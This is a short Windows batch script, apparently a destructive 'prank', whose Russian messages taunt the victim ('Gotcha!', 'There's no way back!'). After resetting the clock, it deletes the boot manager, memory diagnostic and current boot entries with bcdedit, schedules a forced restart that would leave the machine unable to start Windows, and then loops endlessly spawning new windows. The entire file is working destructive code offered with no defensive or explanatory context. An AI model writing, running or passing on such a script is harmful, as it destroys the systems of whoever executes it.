@ECHO OFF
chcp 65001
:: starting "fun"
echo Попался!!
echo Начинается "ВЕСЕЛЬЕ"!
time 0:00
:: R.I.P. PC
bcdedit /delete {ntldr} /f
bcdedit /delete {memdiag} /f
bcdedit /delete {current} /f
:: no comments
echo Пути назад нету!
pause
shutdown /r /t 15
:fun
start echo "Веселись!"
goto fun